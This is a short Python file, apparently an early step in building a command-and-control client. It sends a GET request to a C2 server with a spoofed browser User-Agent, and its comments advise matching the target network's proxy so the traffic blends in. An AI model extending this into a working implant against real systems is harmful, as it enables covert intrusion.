# Command and Control client Code

from requests import get

# Keep the User-Agent look like a modern browser
HEADER = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/557.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/plain"
}

# Set a proxy to match what your target network will be using, if you know it
# PROXY = None {"https": "proxy.some-site.com:443"}
PROXY = None

# Port c2 server listens on
PORT = 80

# Set the c2 server's IP address or hostname
C2_SERVER = "localhost"

x = get(url=f"http://{C2_SERVER}:{PORT}", headers=HEADER, proxies=PROXY)
print(x.headers)